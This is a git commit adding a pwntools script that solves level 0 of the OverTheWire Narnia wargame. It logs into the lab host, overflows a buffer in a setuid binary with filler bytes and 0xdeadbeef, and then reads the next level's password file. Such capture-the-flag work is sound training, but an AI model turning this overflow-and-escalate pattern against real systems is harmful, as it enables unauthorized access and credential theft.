bad9910c2ae7641674347593465f0d740957ed98
defstryker <defstryker@hotmail.com>
2016-09-29 00:39:28 +0800

    first narnia..finally

---
+++ overthewire/narnia/level0.py
@@ -0,0 +1,31 @@
+from pwn import *
+
+# vars ...
+user = 'narnia0'
+host = 'narnia.labs.overthewire.org'
+password = 'narnia0'
+shell = ssh(user, host, password=password)
+sh = shell.run('bash')
+sh.recvuntil('$ ')
+############################################
+sh.sendline('cd /narnia/')
+sh.recvuntil('$ ')
+fill = b'C'*20
+exp = p32(0xdeadbeef)
+log.info('trying exploit ...')
+sh.sendline('./narnia0')
+sh.sendline(fill + exp)
+r = sh.recvuntil('$ ')
+log.info('checking if it works ... ')
+sh.sendline('whoami')
+if sh.recvuntil('$ ').decode()[:7] == 'narnia1':
+    log.success('pwned')
+    log.info('fetching password')
+    sh.sendline('cat /etc/narnia_pass/narnia1')
+    p = sh.recvuntil('$').decode()
+    log.success(p[:p.index('\n')])
+else:
+    log.critical('exploit failed!!')
+
+
+
